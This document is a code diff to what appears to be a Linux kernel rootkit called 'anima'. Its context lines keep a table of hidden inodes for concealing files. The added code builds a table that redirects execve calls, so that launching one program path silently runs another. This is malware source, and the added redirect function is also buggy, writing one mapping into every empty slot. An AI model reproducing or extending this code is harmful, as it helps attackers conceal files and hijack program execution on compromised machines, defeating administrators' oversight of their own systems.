@@ -1,6 +1,7 @@
 #include <linux/printk.h>
 
 #include <anima/config.h>
+#include <anima/libc.h>
 
 static u64 hidden_inodes[MAX_HIDDEN_INODES] = {0};
 
@@ -32,6 +33,44 @@ void unhide_inode(u64 ino)
 		if (hidden_inodes[i] == ino) {
 			hidden_inodes[i] = 0;
 			break;
+		}
+	}
+}
+
+struct redirect_path {
+	char *old_path;
+	char *new_path;
+};
+
+struct redirect_path redirect_pathes[16] = { {NULL, NULL} };
+
+char *redirect_execve(char *old_path)
+{
+	for (int i = 0; i < 16; i++)
+		if (redirect_pathes[i].old_path
+		    && !anima_strcmp(redirect_pathes[i].old_path, old_path))
+			return redirect_pathes[i].new_path;
+
+	return NULL;
+}
+
+void redirect_execve_path(char *old_path, char *new_path)
+{
+	for (int i = 0; i < 16; i++) {
+		if (!redirect_pathes[i].old_path) {
+			redirect_pathes[i].old_path = old_path;
+			redirect_pathes[i].new_path = new_path;
+		}
+	}
+}
+
+void unredirect_execve_path(const char *old_path)
+{
+	for (int i = 0; i < 16; i++) {
+		if (redirect_pathes[i].old_path
+		    && !anima_strcmp(redirect_pathes[i].old_path, old_path)) {
+			redirect_pathes[i].old_path = NULL;
+			redirect_pathes[i].new_path = NULL;
 		}
 	}
 }
